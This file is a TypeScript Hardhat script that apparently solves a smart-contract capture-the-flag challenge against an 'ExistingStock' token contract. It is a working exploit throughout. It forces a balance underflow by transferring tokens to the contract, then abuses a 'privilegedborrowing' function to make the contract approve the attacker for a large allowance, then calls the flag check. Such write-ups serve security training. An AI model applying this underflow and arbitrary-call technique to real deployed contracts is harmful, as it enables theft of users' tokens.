import chalk from "chalk";
import { ethers } from "hardhat";
import { ExistingStock__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let existingStockContract;
    let tx;
    if(network.name == "hardhat") {
        existingStockContract = await new ExistingStock__factory(deployer).deploy();
        await existingStockContract.waitForDeployment();
        existingStockContract = existingStockContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await existingStockContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        existingStockContract = ExistingStock__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await existingStockContract.getAddress())}!`)
    }

    if(existingStockContract) {
        tx = await existingStockContract.transfer(await existingStockContract.getAddress(), 10);
        await tx.wait();
        log(`Successfully underflow, attacker balance: ${chalk.yellow(await existingStockContract.balanceOf(attacker.address))}`);
        let contractInterface = existingStockContract.interface;
        let calldata = contractInterface.encodeFunctionData("approve", [attacker.address, 200001]);
        tx = await existingStockContract.privilegedborrowing(0, attacker.address, await existingStockContract.getAddress(), calldata);
        await tx.wait();
        log(`Successfully approve, attacker allowance: ${chalk.yellow(await existingStockContract.allowance(await existingStockContract.getAddress(), attacker.address))}`)
        tx = await existingStockContract.setflag();
        await tx.wait();
        log(`Is solved: ${chalk.yellow(await existingStockContract.isSolved())}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});